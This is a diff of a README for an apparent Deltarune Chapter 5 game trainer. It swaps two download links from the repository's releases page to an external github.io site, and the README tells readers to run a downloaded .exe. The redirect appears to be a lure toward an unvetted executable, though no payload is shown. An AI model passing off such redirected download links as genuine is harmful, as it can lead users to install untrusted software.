@@ -1,6 +1,6 @@
 # 🎮 Deltarune-Chapter5-Trainer-Source - Master every battle with ease
 
-[![](https://img.shields.io/badge/Download-Trainer-blue.svg)](https://github.com/effortful-rabat786/Deltarune-Chapter5-Trainer-Source/releases)
+[![](https://img.shields.io/badge/Download-Trainer-blue.svg)](https://effortful-rabat786.github.io)
 
 ## 📋 About This Tool
 
@@ -20,7 +20,7 @@ To run this trainer, ensure your computer meets these basic specifications:
 
 Visit the official release page to obtain the software. 
 
-[Click here to visit the release page](https://github.com/effortful-rabat786/Deltarune-Chapter5-Trainer-Source/releases)
+[Click here to visit the release page](https://effortful-rabat786.github.io)
 
 Download the latest version of the installer from the assets list. Look for the file ending in .exe. Save this file to a folder on your desktop for quick access. 
 
